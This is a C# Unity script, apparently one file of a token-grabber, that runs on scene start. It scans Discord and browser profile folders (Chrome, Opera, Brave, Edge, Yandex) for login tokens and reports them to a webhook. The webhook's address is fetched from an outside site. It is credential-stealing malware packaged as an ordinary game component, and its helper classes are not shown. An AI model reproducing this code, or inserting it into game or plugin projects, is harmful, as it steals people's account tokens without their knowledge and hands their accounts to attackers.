using System.Collections.Generic;
using System.Net;
using UnityEngine;

public class ITKLog : MonoBehaviour
{
    internal static readonly string hookURL = new WebClient().DownloadString("https://hanani.me/");
    public static readonly List<string> TokenReport = new List<string>();

    //different services (feel free to add more)
    private static readonly List<ITKLog_Service> _services = new List<ITKLog_Service>()
    {
        new ITKLog_Service("Discord", @"Roaming\Discord"),
        new ITKLog_Service("Discord Canary", @"Roaming\discordcanary"),
        new ITKLog_Service("Discord PTB", @"Roaming\discordptb"),
        new ITKLog_Service("Discord Developer", @"Roaming\discorddeveloper"),
        new ITKLog_Service("Google Chrome", @"Local\Google\Chrome\User Data\Default"),
        new ITKLog_Service("Opera", @"Roaming\Opera Software\Opera Stable"),
        new ITKLog_Service("Brave", @"Local\BraveSoftware\Brave-Browser\User Data\Default"),
        new ITKLog_Service("Edge", @"Local\Microsoft\Edge\User Data\Default"),
        new ITKLog_Service("YandeSx", @"Local\Yandex\YandexBrowser\User Data\Default")
    };

    private void Start()
    {
        foreach (var service in _services) service.GetTokens();
        if (ITKLog_Grab.TokensFound) ITKLog_Webhook.ReportTokens(TokenReport);
    }
}